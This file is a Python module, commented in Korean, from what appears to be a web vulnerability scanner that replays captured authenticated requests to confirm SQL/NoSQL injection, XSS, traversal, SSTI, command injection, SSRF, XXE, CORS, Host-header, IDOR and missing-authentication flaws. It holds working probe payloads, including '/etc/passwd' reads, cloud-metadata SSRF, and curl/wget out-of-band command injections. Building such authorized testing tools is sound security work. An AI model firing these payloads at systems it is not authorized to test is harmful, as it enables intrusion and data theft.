"""캡처 기반 능동 검증 (replay) — 진짜 인증 요청을 재전송하며 표적 변형.

blind 스캐너(ZAP 스파이더)의 한계: 인증 세션·정확한 바디 파라미터를 몰라
POST API 를 유효하게 못 때린다. 캡처에는 그 모든 게 있으므로, **실제 요청을
baseline 으로 재전송**하고 파라미터 하나만 변형해 확증한다:
  - SQLi   : 값 + `'`(오류) / 불리언 참·거짓 응답차
  - XSS    : 마커 반사(미이스케이프)
  - 권한검증(IDOR/BOLA): 객체참조 파라미터(corp_sn 등)를 남의 id 로 바꿔
             같은 세션으로 접근 → 200+데이터면 접근통제 실패. (무효 id 대조로 오탐↓)

패킷 전송 → 인가 대상 전용. 캡처의 세션 쿠키(또는 SAST_HTTP_COOKIE)를 그대로 사용.
비파괴 payload 만(RCE/파일쓰기 없음). 상태변경(POST save 등)은 IDOR 은 읽기형만 시도.
"""
import hashlib, json, os, re, ssl, time, urllib.request, urllib.error
from urllib.parse import urlparse, parse_qsl, urlencode
from .schema import new_finding
from .capture import _SQL_ERR, _IDOR_NAME, _body_params, _headers
from . import env

TIMEOUT = 10
MAX_REQ = int(os.environ.get("SAST_REPLAY_REQ", "600"))
DELAY = float(os.environ.get("SAST_REPLAY_DELAY", "0.05"))
XSS_MARK = "okr7xq<z>"
_LOGIN_SIG = re.compile(r"(login|signin|로그인|비밀번호|아이디를?\s*입력|인증이?\s*필요)", re.I)
_DROP_H = {"content-length", "host", "connection", "accept-encoding", "if-modified-since", "if-none-match"}
_req = [0]
truncated = [False]     # 요청 상한 도달로 부분 스캔이 되었는가 (report meta 로 전달)
_warned = [False]


def _ctx():
    return env.ssl_context()     # 기본 검증 on, SAST_INSECURE_TLS=1 시에만 비활성


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def _send(method, url, headers, body, redirect=True):
    if _req[0] >= MAX_REQ:
        if not _warned[0]:
            print(f"[!] 요청 상한 {MAX_REQ} 도달 — 이후 프로브 생략, 결과 부분적(SAST_REPLAY_REQ 로 상향)")
            _warned[0] = True; truncated[0] = True
        return None
    _req[0] += 1
    time.sleep(DELAY)
    data = body.encode("utf-8") if body else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={k: v for k, v in headers.items() if k})
    try:
        if redirect:
            r = urllib.request.urlopen(req, timeout=TIMEOUT, context=_ctx())
        else:   # 리다이렉트 비추적(오픈리다이렉트 탐지) — 3xx 는 HTTPError 로 잡혀 아래서 반환
            opener = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=_ctx()))
            r = opener.open(req, timeout=TIMEOUT)
        with r:
            return r.status, {k.lower(): v for k, v in r.headers.items()}, r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, (e.read(80000).decode("utf-8", "replace") if hasattr(e, "read") else "")
    except Exception:
        return None


def _headers_for(ex, cookie=None):
    h = {k: v for k, v in ex["req_headers"].items() if k not in _DROP_H}
    ck = cookie or os.environ.get("SAST_HTTP_COOKIE")
    if ck:
        h.pop("cookie", None); h.pop("authorization", None)   # 캡처 자격 제거 후 override
        if ck.startswith("Bearer "):
            h["Authorization"] = ck                           # JSON/토큰 인증
        else:
            h["Cookie"] = ck
    return h


_STATIC = re.compile(r"\.(?:css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|map|txt|xml)$", re.I)
_PUBLIC = {"/", "/robots.txt", "/sitemap.xml", "/favicon.ico"}


# 상용 DAST role 보강 — SSTI/명령인젝션/SSRF/오픈리다이렉트/CRLF/XXE
_SSTI = [("{{7*7}}", "oz{{7*7}}oz"), ("${7*7}", "oz${7*7}oz"), ("#{7*7}", "oz#{7*7}oz"),
         ("<%= 7*7 %>", "oz<%= 7*7 %>oz")]
_CMD = [";id", "|id", "`id`", "$(id)", ";type C:\\Windows\\win.ini"]
_URLISH = re.compile(r"(url|uri|link|src|dest|target|callback|webhook|image|img|feed|proxy|fetch|load|site|domain|host|redirect|open|next|out)", re.I)
_REDIR = re.compile(r"(redirect|url|next|return|dest|target|goto|continue|back|out|link|to|u$)", re.I)
_META = re.compile(r"ami-id|instance-id|iam/|meta-data|placement/|security-credentials")
_SSRF_PAYLOADS = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/", "http://localhost/"]
_XXE = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY okx SYSTEM "file:///etc/passwd">]><r>&okx;</r>')
_NOSQL_ERR = re.compile(r"MongoError|Mongoose|MongoDB|BSON|CastError|E11000|\$where|"
                        r"unexpected token.*in JSON|couchdb|no such (function|operator)", re.I)

_STORED_MARK = "okrStored9z"                 # 저장형 XSS 고유 마커
_STORED_PAYLOAD = '"><' + _STORED_MARK + '>'  # 속성 탈출 + 태그(미이스케이프면 '<' 그대로 반사)
_STORED_RAW = "<" + _STORED_MARK


def _had_auth(ex):
    return bool(ex["req_headers"].get("cookie") or ex["req_headers"].get("authorization"))


def _no_auth_headers(ex):
    """세션/인증 헤더를 모두 제거한 헤더(인증 부재 프로브용)."""
    return {k: v for k, v in ex["req_headers"].items()
            if k not in _DROP_H and k.lower() not in ("cookie", "authorization")}


def _looks_text(val):
    """텍스트성 파라미터인가(이름·이메일·메모 등) — 저장형 XSS 주입 대상. 숫자/날짜/id 제외.
    빈 값(크롤 폼 필드는 값이 없음)은 타입 불명 → 주입 대상으로 본다."""
    v = str(val or "").strip()
    if not v:
        return True
    return len(v) < 60 and not re.fullmatch(r"[\d\-:/.\s]+", v)


def _is_read(ex):
    """읽기형 요청인가? (2계정 IDOR 은 비파괴 읽기에만 — save/delete 등 제외)"""
    p = ex["path"].lower()
    if any(w in p for w in ("save", "delete", "update", "insert", "write", "remove", "add", "modify", "logout")):
        return False
    return ex["method"] == "GET" or any(w in p for w in ("search", "list", "view", "detail", "get", "read", "info", "payment", "inout"))


def _idor_worthy(ex):
    """2계정 IDOR 교차확증 대상? — 캡처에서 인증됐고, 비정적/비공개 데이터 읽기."""
    if not (ex["req_headers"].get("cookie") or ex["req_headers"].get("authorization")):
        return False                                  # 캡처에서 인증 안 된 요청 = 공개 → 제외
    if ex["path"] in _PUBLIC or _STATIC.search(ex["path"]):
        return False
    if not _is_read(ex):
        return False
    # 민감 신호: /api/ 데이터 엔드포인트 또는 객체참조 파라미터 보유
    return "/api/" in ex["path"] or any(_IDOR_NAME.search(k) for k, _, _ in _params(ex))


def _params(ex):
    """(key, value, loc) — loc in {query, body, json}."""
    out = [(k, v, "query") for k, v in ex["query"]]
    out += [(k, v, loc) for k, v, loc in _body_params(ex)]
    return out


def _mutate(ex, key, loc, newval):
    """해당 파라미터만 newval 로 바꾼 (url, body) 재구성. 나머지는 캡처 원본값 유지."""
    pr = urlparse(ex["url"])
    q = dict(parse_qsl(pr.query, keep_blank_values=True))
    body = ex["req_body"] or ""
    ct = (ex["req_headers"].get("content-type") or "").lower()
    if loc == "query":
        q[key] = newval
        url = pr._replace(query=urlencode(q)).geturl(); return url, body
    url = pr._replace(query=urlencode(q)).geturl() if q else ex["url"]
    if loc == "json" or "application/json" in ct:
        try:
            obj = json.loads(body); obj[key] = newval; return url, json.dumps(obj)
        except Exception:
            return url, body
    bd = dict(parse_qsl(body, keep_blank_values=True)); bd[key] = newval
    return url, urlencode(bd)


def _resp_len(r):
    return len(r[2]) if r else 0


def _ck_fp(ck):
    """세션 쿠키 지문(값 비노출) — 로그인 전후 세션이 바뀌었는지 비교용."""
    return ("sess#" + hashlib.sha1(ck.encode()).hexdigest()[:6]) if ck else "-"


_EMAIL = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
_KRPHONE = re.compile(r"01[016-9]-?\d{3,4}-?\d{4}")
_NUMID = re.compile(r"\b\d{5,}\b")


def _data_tokens(body):
    """응답 본문에서 계정 고유 식별 데이터 후보 추출(이메일·휴대폰·장자리 숫자 id)."""
    body = body or ""
    toks = set(_EMAIL.findall(body)[:10]) | set(_KRPHONE.findall(body)[:10]) | set(_NUMID.findall(body)[:10])
    return {t for t in toks if len(t) >= 4}


def _blocked(r):
    """접근 차단(정상 authz) 신호: 403/401, 로그인 리다이렉트, 로그인 화면."""
    if not r:
        return True
    if r[0] in (401, 403):
        return True
    loc = r[1].get("location", "")
    if 300 <= r[0] < 400 and _LOGIN_SIG.search(loc):
        return True
    if _LOGIN_SIG.search(r[2][:2000]):
        return True
    return False


def scan_capture(exchanges, session=None, session_b=None, oob=None):
    _req[0] = 0; _warned[0] = False; truncated[0] = False
    base_hosts = {ex["host"] for ex in exchanges if ex["host"]}
    ck_a = session.cookie if session else None
    mode = f" · 세션 A={session.label}" + (f", B={session_b.label} (IDOR 교차확증)" if session_b else "") if session else ""
    print(f"[*] replay 검증: 캡처 {len(exchanges)}건 · 호스트 {', '.join(sorted(base_hosts))} (인가 대상 전제·비파괴){mode}")
    print("[*] role: 무인증접근 · SQLi · NoSQL · XSS(반사/저장형) · LFI · SSTI · 명령인젝션 · SSRF · XXE · "
          "오픈리다이렉트 · CRLF · CORS · Host헤더 · 인증부재/우회 · IDOR(단일/2계정)"
          + (" · OOB(blind)" if oob is not None else ""))
    eff_ck = (session.cookie if session else None) or os.environ.get("SAST_HTTP_COOKIE")
    src = "로그인 세션" if session else ("제공 쿠키" if eff_ck else "비인증")
    print(f"[*] 사용 세션: {src} · 지문 {_ck_fp(eff_ck)}"
          + (" (로그인 전과 지문 같으면 세션 변화 없음)" if session else ""))
    seen, reps = set(), []
    for ex in exchanges:
        sig = (ex["method"], ex["path"], tuple(sorted(k for k, _, _ in _params(ex))))
        if sig in seen or not ex["url"].startswith("http"):
            continue
        seen.add(sig); reps.append(ex)

    findings, seen_f = [], set()

    def add(f):
        k = (f["rule"], f["file"], f.get("evidence", "")[:40])
        if k not in seen_f:
            seen_f.add(k); findings.append(f)

    # ── 패스 0: 무인증 접근 스윕 (id/pw 없이 뭐가 열리는지부터) ──
    _unauth_sweep(reps, add)

    for ex in reps:
        hdr = _headers_for(ex, ck_a)
        base = _send(ex["method"], ex["url"], hdr, ex["req_body"] or None)
        # 세션 만료(로그인 리다이렉트) 시 1회 재로그인 후 재시도
        if session and _blocked(base):
            if session.reauth():
                ck_a = session.cookie; hdr = _headers_for(ex, ck_a)
                base = _send(ex["method"], ex["url"], hdr, ex["req_body"] or None)
        if not base:
            continue
        bl = _resp_len(base)

        # ── XXE(본문 레벨): XML 요청이면 외부 엔티티로 /etc/passwd 읽기 시도(인밴드) ──
        _ct = (ex["req_headers"].get("content-type") or "").lower()
        _b0 = (ex["req_body"] or "").lstrip()
        if "xml" in _ct or _b0.startswith("<?xml") or _b0[:1] == "<":
            rxxe = _send(ex["method"], ex["url"], hdr, _XXE)
            if rxxe and re.search(r"root:.*:0:0:", rxxe[2]):
                add(_f("xxe", "high", ex, "(XML본문)", "external entity file:///etc/passwd",
                       "XXE — 외부 엔티티로 /etc/passwd 반환", "true_positive"))
            if oob is not None:      # blind XXE: 외부 엔티티가 OOB 로 역접속
                tok = oob.new("xxe", ex, "(XML본문)")
                _send(ex["method"], ex["url"], hdr,
                      f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY okx SYSTEM "{oob.url(tok)}">]><r>&okx;</r>')

        # ── CORS 오설정: 위조 Origin 반영 ──
        hco = dict(hdr); hco["Origin"] = "https://evil.example"
        rco = _send(ex["method"], ex["url"], hco, ex["req_body"] or None)
        if rco:
            acao = (rco[1].get("access-control-allow-origin", "") or "")
            acac = (rco[1].get("access-control-allow-credentials", "") or "").lower()
            if acao == "https://evil.example" or (acao == "*" and acac == "true"):
                add(_f("cors-misconfig", "high", ex, "(Origin)", "Origin: https://evil.example",
                       f"위조 Origin 반영(ACAO={acao}, creds={acac or 'n/a'}) — 크로스오리진 데이터 탈취", "true_positive"))
        # ── Host 헤더 인젝션: 위조 Host 가 응답/리다이렉트에 반영 ──
        hho = dict(hdr); hho["Host"] = "evil.example"; hho["X-Forwarded-Host"] = "evil.example"
        rho = _send(ex["method"], ex["url"], hho, ex["req_body"] or None)
        if rho and "evil.example" in (rho[2][:5000] + (rho[1].get("location", "") or "")):
            add(_f("host-header-injection", "medium", ex, "(Host)", "Host: evil.example",
                   "위조 Host 가 응답/Location 에 반영 — 비밀번호재설정 포이즈닝·캐시 포이즈닝 소지", "true_positive"))

        # ── 2계정 권한검증(IDOR): A 요청을 B 세션으로 재전송 → B 응답에 'A 고유 토큰'이 있어야 확정 ──
        # 길이 유사만으로는 세션결정형(/api/mypage 처럼 id 무시하고 자기 데이터 반환) 오탐이 남는다.
        a_ids = [str(v) for k, v, _ in _params(ex) if _IDOR_NAME.search(k) and str(v).strip()]
        if session_b and _idor_worthy(ex) and not _blocked(base) and bl > 50 and a_ids:
            a_tokens = {t for t in (a_ids + list(_data_tokens(base[2]))) if len(t) >= 4}
            hb = _headers_for(ex, session_b.cookie)
            rb = _send(ex["method"], ex["url"], hb, ex["req_body"] or None)
            if rb and not _blocked(rb) and 200 <= rb[0] < 300 and _resp_len(rb) > 50:
                hit = sorted(t for t in a_tokens if t in rb[2])[:3]
                if hit:
                    f = _f("idor", "high", ex, "(계정간)", "B세션이 A데이터 획득",
                           f"타 계정({session_b.label}) 세션이 A({session.label}) 데이터 획득 — A 식별토큰 {hit} 이 B 응답에 존재",
                           "true_positive")
                    f["confidence"] = 0.9
                    f["rationale"] = ("2계정 교차확증: B 세션으로 A 요청 재전송 시 A 고유 식별자가 B 응답 본문에 존재 "
                                      "→ 객체수준 접근통제(BOLA/IDOR) 확정.")
                    add(f)
                else:
                    f = _f("idor", "medium", ex, "(계정간)", "B세션 접근가능·A토큰 미검출",
                           f"B({session_b.label}) 세션이 엔드포인트 200(데이터형)이나 A 고유 토큰 미검출 — 세션결정형 여부 수동 확인",
                           "needs_review")
                    f["confidence"] = 0.4
                    f["rationale"] = ("B 세션이 접근은 되나 A 고유 식별자가 응답에 없음 → 세션이 객체를 결정하는 "
                                      "엔드포인트일 수 있음(IDOR 아님 가능). 객체참조 파라미터 조작으로 수동 확인 권장.")
                    add(f)
        for key, val, loc in _params(ex):
            val = val or "1"
            # ── SQLi: 오류 시그니처 ──
            u, b = _mutate(ex, key, loc, val + "'")
            r = _send(ex["method"], u, hdr, b)
            if r and _SQL_ERR.search(r[2]) and not _SQL_ERR.search(base[2]):
                add(_f("sql-injection", "critical", ex, key, val + "'",
                       "SQL 오류 시그니처 반사", "true_positive"))
                continue
            # ── SQLi: 불리언 응답차 ──
            ut, bt = _mutate(ex, key, loc, val + "' AND '1'='1")
            uf, bf = _mutate(ex, key, loc, val + "' AND '1'='2")
            rt, rf = _send(ex["method"], ut, hdr, bt), _send(ex["method"], uf, hdr, bf)
            if rt and rf:
                lt, lf = _resp_len(rt), _resp_len(rf)
                if abs(lt - bl) < max(20, 0.02 * bl) and abs(lf - lt) > max(60, 0.08 * max(lt, 1)):
                    add(_f("sql-injection", "critical", ex, key, "' AND '1'='1 vs '2",
                           f"불리언 응답차(base {bl}·true {lt}·false {lf})", "true_positive"))
            # ── XSS: 마커 반사 ──
            ux, bx = _mutate(ex, key, loc, XSS_MARK)
            rx = _send(ex["method"], ux, hdr, bx)
            if rx and XSS_MARK in rx[2]:
                add(_f("xss", "high", ex, key, XSS_MARK, "마커 미이스케이프 반사", "true_positive"))
            # ── 경로 탐색(LFI): /etc/passwd 반환 ──
            up, bp = _mutate(ex, key, loc, "../../../../../../etc/passwd")
            rp = _send(ex["method"], up, hdr, bp)
            if rp and re.search(r"root:.*:0:0:", rp[2]):
                add(_f("path-traversal", "high", ex, key, "../../../../../../etc/passwd",
                       "/etc/passwd 내용 반환", "true_positive"))
            # ── SSTI: 템플릿 산술 평가(oz49oz) ──
            for _p, _pl in _SSTI:
                us, bs = _mutate(ex, key, loc, _pl)
                rs = _send(ex["method"], us, hdr, bs)
                if rs and "oz49oz" in rs[2]:
                    add(_f("ssti", "critical", ex, key, _pl, f"템플릿 산술 평가됨({_p}→49)", "true_positive")); break
            # ── 명령 인젝션: 출력 기반(uid= / win.ini) ──
            for _cp in _CMD:
                uc, bc = _mutate(ex, key, loc, val + _cp)
                rc = _send(ex["method"], uc, hdr, bc)
                if rc and (re.search(r"uid=\d+\(", rc[2]) or "[extensions]" in rc[2].lower()):
                    add(_f("command-injection", "critical", ex, key, val + _cp, "OS 명령 출력 반환", "true_positive")); break
            # ── SSRF: URL성 파라미터 → 내부 메타데이터 반영(인밴드) ──
            if _URLISH.search(key) or str(val).lower().startswith("http"):
                for _sp in _SSRF_PAYLOADS:
                    ur, br = _mutate(ex, key, loc, _sp)
                    rr = _send(ex["method"], ur, hdr, br)
                    if rr and _META.search(rr[2]):
                        add(_f("ssrf", "high", ex, key, _sp, "내부 메타데이터/서비스 응답 반영", "true_positive")); break
            # ── 오픈 리다이렉트: 외부로 3xx ──
            if _REDIR.search(key) or str(val).startswith(("http", "/")):
                ur, br = _mutate(ex, key, loc, "https://evil.example/")
                rr = _send(ex["method"], ur, hdr, br, redirect=False)
                if rr and 300 <= rr[0] < 400 and "evil.example" in (rr[1].get("location", "")):
                    add(_f("open-redirect", "medium", ex, key, "https://evil.example/",
                           f"외부 리다이렉트 Location={rr[1].get('location','')[:60]}", "true_positive"))
            # ── CRLF/헤더 인젝션: 응답 헤더에 주입 ──
            ucr, bcr = _mutate(ex, key, loc, val + "\r\nokrcrlf:1")
            rcr = _send(ex["method"], ucr, hdr, bcr)
            if rcr and any("okrcrlf" in str(k).lower() or "okrcrlf" in str(v).lower() for k, v in (rcr[1] or {}).items()):
                add(_f("crlf-injection", "medium", ex, key, "\\r\\nokrcrlf:1", "응답 헤더 주입됨", "true_positive"))
            # ── NoSQL 인젝션: 오류 기반 + JSON $ne 연산자 ──
            for _np in ('"', "'", '{"$gt":""}', "[$ne]"):
                un, bn = _mutate(ex, key, loc, _np)
                rn = _send(ex["method"], un, hdr, bn)
                if rn and _NOSQL_ERR.search(rn[2]) and not _NOSQL_ERR.search(base[2]):
                    add(_f("nosql-injection", "critical", ex, key, _np, "NoSQL 오류 시그니처 반사", "true_positive")); break
            if loc == "json":       # JSON 바디: 연산자 객체 주입($ne) → 인증우회성 응답차
                un, bn = _mutate(ex, key, loc, {"$ne": None})
                rn = _send(ex["method"], un, hdr, bn)
                if rn and 200 <= rn[0] < 300 and abs(_resp_len(rn) - bl) > max(60, 0.1 * max(bl, 1)):
                    f = _f("nosql-injection", "high", ex, key, '{"$ne":null}',
                           f"$ne 연산자 주입 응답차(base {bl}·주입 {_resp_len(rn)}) — NoSQL 인젝션 후보", "needs_review")
                    f["confidence"] = 0.5; add(f)
            # ── OOB(blind SSRF/RCE): 콜백 URL 주입(응답 아닌 역접속으로 확증) ──
            if oob is not None:
                if _URLISH.search(key) or str(val).lower().startswith("http"):
                    tok = oob.new("ssrf", ex, key)
                    uo, bo = _mutate(ex, key, loc, oob.url(tok)); _send(ex["method"], uo, hdr, bo)
                tok = oob.new("rce", ex, key); ou = oob.url(tok)
                for _pl in (f";curl {ou}", f"|curl {ou}", f"`curl {ou}`", f";wget -qO- {ou}"):
                    uo, bo = _mutate(ex, key, loc, val + _pl); _send(ex["method"], uo, hdr, bo)
            # ── 권한검증(IDOR): 객체참조 파라미터를 남의 id 로 ──
            if _IDOR_NAME.search(key) and re.fullmatch(r"\d{1,12}", str(val).strip()):
                iv = int(val)
                other = str(iv + 1 if iv != 1 else 2)
                ctrl = "987654321"
                uo, bo = _mutate(ex, key, loc, other)
                uc, bc = _mutate(ex, key, loc, ctrl)
                ro, rc = _send(ex["method"], uo, hdr, bo), _send(ex["method"], uc, hdr, bc)
                if ro and not _blocked(ro) and 200 <= ro[0] < 300:
                    lo, lc = _resp_len(ro), _resp_len(rc)
                    # 남의 id 는 데이터형 응답, 무효 id 는 빈/오류 → 실제 레코드 접근 정황
                    if lo > 50 and (not rc or abs(lo - lc) > max(40, 0.1 * lo)):
                        f = _f("idor", "high", ex, key, f"{key}={other}",
                               f"타 객체 id 접근 200+데이터(base {bl}·other {lo}·invalid {lc}) · 로그인/403 미발생",
                               "needs_review")
                        f["confidence"] = 0.65
                        f["rationale"] = ("동일 세션으로 남의 객체 id 응답이 데이터형(200)이고 무효 id 와 다름 → "
                                          "객체수준 접근통제(BOLA/IDOR) 실패 정황. 두 계정으로 교차 확증 권장.")
                        add(f)

    # ── 저장형(Stored) XSS: 쓰기 엔드포인트에 마커 주입 → 읽기 엔드포인트 재조회서 미이스케이프 반사 확인 ──
    _stored_xss(reps, ck_a, add)

    # ── OOB 콜백 수집: 역접속 온 토큰 → blind SSRF/XXE/RCE 확증 ──
    if oob is not None:
        _CAT = {"ssrf": "ssrf", "xxe": "xxe", "rce": "command-injection"}
        hits = oob.collect()
        for tok, ((kind, ex, param), hit) in hits.items():
            add(_f(_CAT.get(kind, "ssrf"), "critical", ex, param, f"OOB {kind}",
                   f"OOB 콜백 수신 — blind {kind} 확증(역접속 src={hit.get('src', '')}, path={hit.get('path', '')[:40]})",
                   "true_positive"))
        print(f"[*] OOB: 콜백 {len(hits)}건 수신(blind 확증)")

    print(f"[*] replay 검증: 요청 {_req[0]}건 · 확증/후보 {len(findings)}건")
    return findings


def _unauth_sweep(reps, add):
    """무인증 접근 점검 — 캡처에서 인증(쿠키)됐던 요청을 세션/인증 헤더 제거 후 재전송.
    차단 없이 데이터/성공 반환하면 인증·권한 부재(Missing Auth / Broken Access Control)."""
    authed = [ex for ex in reps if _had_auth(ex)]
    if not authed:
        return
    hit = 0
    for ex in authed:
        r = _send(ex["method"], ex["url"], _no_auth_headers(ex), ex["req_body"] or None)
        if r and not _blocked(r) and 200 <= r[0] < 300 and _resp_len(r) > 50:
            hit += 1
            f = _f("missing-auth", "critical", ex, "(무인증)", "세션/인증 제거 재전송",
                   f"인증 없이 {ex['method']} {ex['path']} 처리됨({r[0]}, len {_resp_len(r)}) — 인증/권한 부재(CWE-306)",
                   "true_positive")
            f["confidence"] = 0.85
            f["rationale"] = ("캡처에서 인증(쿠키)이 있던 요청을 세션/인증 헤더 제거 후 재전송했을 때 차단 없이 "
                              "데이터/성공 반환 → 서버가 인증을 강제하지 않음. 상태변경이면 비인증 조작·계정탈취로 연결.")
            add(f)
    print(f"[*] 무인증 접근 점검: 인증대상 {len(authed)}개 중 {hit}개 무인증 접근 가능"
          + (" ⚠" if hit else ""))


def _stored_xss(reps, ck_a, add):
    """저장→재조회 2단계. 상태변경 요청의 텍스트 파라미터에 마커를 저장하고,
    GET 엔드포인트들을 재조회해 마커가 미이스케이프로 반사되면 저장형 XSS 확정."""
    writers = [ex for ex in reps if ex["method"] in ("POST", "PUT", "PATCH") and not _is_read(ex)]
    writes = []                              # 주입한 (writer, key) — 2단계 PoC 용
    for ex in writers:
        for key, val, loc in _params(ex):
            if _looks_text(val):
                u, b = _mutate(ex, key, loc, _STORED_PAYLOAD)
                if _send(ex["method"], u, _headers_for(ex, ck_a), b):
                    writes.append((ex, key))
    if not writes:
        return
    for ex in [e for e in reps if e["method"] == "GET"]:
        r = _send("GET", ex["url"], _headers_for(ex, ck_a), None)
        if r and _STORED_RAW in r[2]:      # '<okrStored9z' 그대로 = '<' 미이스케이프
            f = _f("xss", "high", ex, "(저장형)", _STORED_PAYLOAD,
                   f"저장형 XSS — 주입 마커가 {ex['path']} 응답에 미이스케이프 반사(저장→재조회 확인)",
                   "true_positive")
            f["poc"] = _stored_poc(writes, ex)      # 저장(주입)→조회(반사) 2단계 재현
            add(f)
            return


def _stored_poc(writes, read_ex):
    """저장형 XSS 2단계 재현: 1) 마커 저장(쓰기)  2) 조회(반사 확인)."""
    lines = ["# 1) 저장(payload 주입):"]
    for wex, key in writes[:3]:              # 대표 쓰기 요청 몇 개
        lines.append(_build_poc(wex, key, _STORED_PAYLOAD))
    lines.append("# 2) 조회(미이스케이프 반사 확인):")
    lines.append(_build_poc(read_ex, "(조회)", ""))
    lines.append(f"#    → 응답에 '{_STORED_RAW}' 가 그대로 있으면 저장형 XSS")
    return "\n".join(lines)


def _loc_of(ex, key):
    if any(k == key for k, _ in ex["query"]):
        return "query"
    for k, _, l in _body_params(ex):
        if k == key:
            return l
    return "query"


def _build_poc(ex, key, payload):
    """점검자가 그대로 붙여 재현할 curl. 정확한 URI + 파라미터/헤더 + payload."""
    method, url = ex["method"], ex["url"]
    base = url.split("?")[0]
    ck = os.environ.get("SAST_HTTP_COOKIE")
    ckh = f" -H 'Cookie: {ck}'" if ck else ""
    if str(key).startswith("("):                          # 헤더/특수 프로브
        if "Origin" in key:
            return f"curl -si '{url}'{ckh} -H 'Origin: https://evil.example'   # 응답 ACAO 에 반영되는지"
        if "Host" in key:
            return f"curl -si '{url}'{ckh} -H 'Host: evil.example'   # 응답/Location 에 evil.example 반영되는지"
        if "세션" in key or "무인증" in key:
            return f"curl -si -X {method} '{url}'" + (f" --data '{ex['req_body']}'" if ex['req_body'] else "") + "   # 쿠키/인증 헤더 제거(무인증)"
        if "XML" in key:
            return (f"curl -si -X {method} '{url}'{ckh} -H 'Content-Type: application/xml' "
                    f"--data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>'")
        if "계정간" in key:
            return f"# 계정 B 세션 쿠키로 재전송: curl -si -X {method} '{url}' -H 'Cookie: <계정B세션>'" + (f" --data '{ex['req_body']}'" if ex['req_body'] else "")
        return f"curl -si -X {method} '{url}'{ckh}"
    u, b = _mutate(ex, key, _loc_of(ex, key), str(payload))   # 취약 파라미터에 payload 주입
    if method == "GET" and not b:
        return f"curl -si '{u}'{ckh}"
    return f"curl -si -X {method} '{base}'{ckh} -H 'Content-Type: application/x-www-form-urlencoded' --data '{b}'"


def _f(cat, sev, ex, key, payload, ev, verdict):
    where = f"{ex['method']} {ex['path']}"
    ktxt = f"파라미터 '{key}'" if not str(key).startswith("(") else str(key)
    return new_finding(
        fingerprint="replay-" + cat + "-" + re.sub(r"\W+", "", ex["path"])[-30:] + "-" + str(key),
        engines=["replay"], rule="replay-" + cat, full_rule="replay:" + cat, pack="replay-dast",
        category=cat, severity=sev, sev_lock=True, source="DAST", verdict=verdict, confidence=0.9,
        file=ex["url"], line=0,                           # 전체 URI(쿼리 포함) — 점검자 재현용
        message=f"[replay] {cat} — {where} · {ktxt}: {ev}",
        evidence=f"위치 {where}  ·  대상 URL {ex['url']}  ·  주입 {key}={payload}  ·  {ev}",
        poc=_build_poc(ex, key, payload),
        dynamic={"status": "confirmed" if verdict == "true_positive" else "candidate", "evidence": ev})
